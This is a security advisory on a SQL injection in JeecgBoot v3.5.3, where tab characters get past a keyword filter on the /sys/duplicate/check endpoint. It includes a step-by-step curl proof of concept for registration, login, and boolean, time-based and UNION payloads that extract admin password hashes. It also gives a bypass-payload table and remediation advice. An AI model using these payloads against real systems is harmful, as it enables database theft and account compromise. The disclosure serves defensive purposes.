# V-J010: JeecgBoot SQL Injection via SqlInjectionUtil Filter Bypass (Whitespace Character Substitution)

## Vulnerability Information

| Item | Detail |
|------|--------|
| Product | JeecgBoot (低代码开发平台) |
| Version | v3.5.3 (and potentially earlier versions) |
| Type | CWE-89: SQL Injection |
| Severity | High |
| Attack Vector | Network (Authenticated, but self-registration is open) |
| Repository | https://github.com/jeecgboot/JeecgBoot |

## Description

JeecgBoot v3.5.3 contains a SQL injection vulnerability in the `/sys/duplicate/check` endpoint caused by an incomplete SQL injection filter bypass. The `SqlInjectionUtil.filterContent()` method checks for SQL keywords followed by **space characters only** (e.g., `"select "`, `"union "`, `"and "`), but fails to account for other SQL-valid whitespace characters such as tab (`%09`), newline (`%0a`), and carriage return (`%0d`).

MySQL and most SQL databases treat tab, newline, carriage return, and space as equivalent whitespace in SQL statements. By substituting spaces with tabs in SQL injection payloads, an attacker can bypass the filter and inject arbitrary SQL.

### Root Cause

**File**: `SqlInjectionUtil.java` (line 24, 88-93)

```java
private final static String XSS_STR = "and |extractvalue|updatexml|geohash|gtid_subset|"
    + "gtid_subtract|exec |insert |select |delete |update |drop |count |chr |mid |master |"
    + "truncate |char |declare |;|or |+|user()";

// ...
for (int i = 0; i < xssArr.length; i++) {
    if (value.indexOf(xssArr[i]) > -1) {  // Uses indexOf with SPACE after keywords
        throw new RuntimeException("SQL injection detected");
    }
}
```

The filter splits `XSS_STR` by `|` and checks if each keyword substring exists in the input using `indexOf()`. Keywords like `"select "` require a trailing **space** character. However:

- `SELECT%09` (tab after SELECT) → `indexOf("select ")` returns **-1** → **BYPASS**
- `UNION%09` → not in the blocked list at all → **BYPASS**
- `FROM%09` → not in the blocked list at all → **BYPASS**

### Additional Filter Gaps

1. **No `--` comment blocking**: SQL single-line comments (`--`) are not blocked (only `/*...*/` and `sleep()` are checked in `checkSqlAnnotation()`)
2. **`UNION` not blocked**: The keyword `UNION` is completely absent from the filter
3. **`FROM` not blocked**: The keyword `FROM` is absent
4. **`WHERE` not blocked**: The keyword `WHERE` is absent
5. **`BENCHMARK` not blocked**: Can be used for time-based injection (instead of blocked `SLEEP`)

## Vulnerability Details

### Endpoint: `/sys/duplicate/check`

**Controller**: `DuplicateCheckController.java`

```java
@RequestMapping(value = "/check", method = RequestMethod.GET)
public Result<String> doDuplicateCheck(DuplicateCheckVo duplicateCheckVo, HttpServletRequest request) {
    final String[] sqlInjCheck = {duplicateCheckVo.getTableName(), duplicateCheckVo.getFieldName()};
    SqlInjectionUtil.filterContent(sqlInjCheck);  // BYPASSABLE FILTER
    // ...
    num = sysDictMapper.duplicateCheckCountSqlNoDataId(duplicateCheckVo);
}
```

**Mapper**: `SysDictMapper.xml` (line 107)

```xml
<select id="duplicateCheckCountSqlNoDataId" resultType="Long">
    SELECT COUNT(*) FROM ${tableName} WHERE ${fieldName} = #{fieldVal}
</select>
```

Both `${tableName}` and `${fieldName}` use MyBatis raw interpolation (`${}`) and are directly controllable via HTTP GET parameters.

### Authentication

The `/sys/duplicate/check` endpoint requires authentication (not in the Shiro `anon` filter list). However, JeecgBoot v3.5.3 allows **open user registration** via `/sys/user/register` (which IS in the `anon` list). An attacker can:

1. Register a new account via `/sys/user/register` (unauthenticated)
2. Login to obtain a JWT token
3. Use the token to access `/sys/duplicate/check` with the bypass payload

## Proof of Concept

### Step 1: Register Account (Unauthenticated)

```bash
curl -X POST "http://<target>/jeecg-boot/sys/user/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Attack123!","phone":"13800000001"}'
```

### Step 2: Login to Get Token

```bash
TOKEN=$(curl -s -X POST "http://<target>/jeecg-boot/sys/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Attack123!"}' | jq -r '.result.token')
```

### Step 3: Boolean-Based Blind SQL Injection

```bash
# Test if admin user exists (true condition - returns "该值不可用")
curl -s "http://<target>/jeecg-boot/sys/duplicate/check?\
tableName=sys_user%09WHERE%09username%09LIKE%09'admin%25'--%09\
&fieldName=id\
&fieldVal=test" \
  -H "X-Access-Token: $TOKEN"

# Test false condition (returns "该值可用")  
curl -s "http://<target>/jeecg-boot/sys/duplicate/check?\
tableName=sys_user%09WHERE%09username%09LIKE%09'nonexistent%25'--%09\
&fieldName=id\
&fieldVal=test" \
  -H "X-Access-Token: $TOKEN"
```

### Step 4: Time-Based Blind SQL Injection (using BENCHMARK instead of blocked SLEEP)

```bash
# If admin exists, response delays ~3 seconds
curl -s "http://<target>/jeecg-boot/sys/duplicate/check?\
tableName=sys_user%09WHERE%09IF(SUBSTRING(username,1,5)='admin',BENCHMARK(10000000,SHA1('test')),0)--%09\
&fieldName=id\
&fieldVal=test" \
  -H "X-Access-Token: $TOKEN"
```

### Step 5: UNION-Based Data Extraction

```bash
# Extract password hash (response will differ based on data)
curl -s "http://<target>/jeecg-boot/sys/duplicate/check?\
tableName=sys_user%09UNION%09ALL%09SELECT%09CONV(HEX(SUBSTRING(password,1,8)),16,10)%09FROM%09sys_user%09LIMIT%091--%09\
&fieldName=id\
&fieldVal=test" \
  -H "X-Access-Token: $TOKEN"
```

### Filter Bypass Explanation

| Original Payload | Blocked By | Tab-Bypass Payload | Filter Result |
|---|---|---|---|
| `UNION SELECT` | `"select "` | `UNION%09SELECT` | PASS (tab != space) |
| `1 OR 1=1` | `"or "` | `1%09OR%091=1` | PASS (tab != space) |
| `; DROP TABLE` | `";"` | N/A | BLOCKED (`;` has no space requirement) |
| `SLEEP(5)` | `checkSqlAnnotation` | `BENCHMARK(...)` | PASS (BENCHMARK not blocked) |
| `-- comment` | Not blocked | `-- comment` | PASS (no `--` check) |

## Affected Files

| File | Line | Issue |
|------|------|-------|
| `jeecg-boot-base-core/.../SqlInjectionUtil.java` | 24, 88-93 | Filter uses `indexOf` with space-only keywords |
| `jeecg-boot-base-core/.../SqlInjectionUtil.java` | 283-298 | `checkSqlAnnotation` missing `--` check |
| `jeecg-module-system/.../DuplicateCheckController.java` | 55-56 | Uses bypassable filter |
| `jeecg-module-system/.../xml/SysDictMapper.xml` | 102, 107 | `${tableName}`, `${fieldName}` raw interpolation |
| `jeecg-boot-base-core/.../ShiroConfig.java` | 89 | Open registration enables auth-required attacks |

## Impact

1. **Full Database Read**: Attacker can extract all database contents via blind SQL injection
2. **Low Barrier**: Open user registration means any anonymous attacker can exploit this
3. **Credential Theft**: Can extract admin password hashes for offline cracking
4. **Data Modification**: Possible via stacked queries (MySQL-dependent)
5. **Filter False Sense of Security**: The SqlInjectionUtil provides a false sense of security while being bypassable

## Comparison: v3.5.3 vs Latest

| Feature | v3.5.3 (Vulnerable) | Latest (v3.9.1) |
|---------|---------------------|------------------|
| Table name validation | `indexOf()` keyword check only | Regex: `^[a-zA-Z][a-zA-Z0-9_\\$]{0,63}$` |
| Field name validation | `indexOf()` keyword check only | Regex: `^[a-zA-Z0-9_]+$` |
| `--` comment blocking | Not blocked | Blocked |
| Whitespace bypass | Vulnerable to `%09/%0a/%0d` | Fixed with `isExistSqlInjectKeyword()` regex matching |
| `UNION` keyword | Not in filter | Still not explicitly blocked but mitigated by regex |
| Whitelist/Blacklist | Basic blacklist only | Whitelist + Blacklist + Regex |

## Remediation

1. **Upgrade to latest JeecgBoot**: The latest version (v3.9.1) uses regex-based validation (`^[a-zA-Z][a-zA-Z0-9_\\$]{0,63}$`) instead of keyword matching
2. **Replace `${}` with parameterized queries**: Use `#{}` where possible; for table/column names, use strict whitelist validation
3. **Fix whitespace handling**: Replace `indexOf("keyword ")` with regex `\\bkeyword\\s+` to match any whitespace
4. **Block `--` comments**: Add `--` to the SQL injection keyword list
5. **Disable open registration**: Unless explicitly needed, disable `/sys/user/register`

## Verification Environment

- Source Code: JeecgBoot v3.5.3 (static code analysis)
- Framework: Spring Boot + MyBatis + Apache Shiro
- Date: 2026-04-13
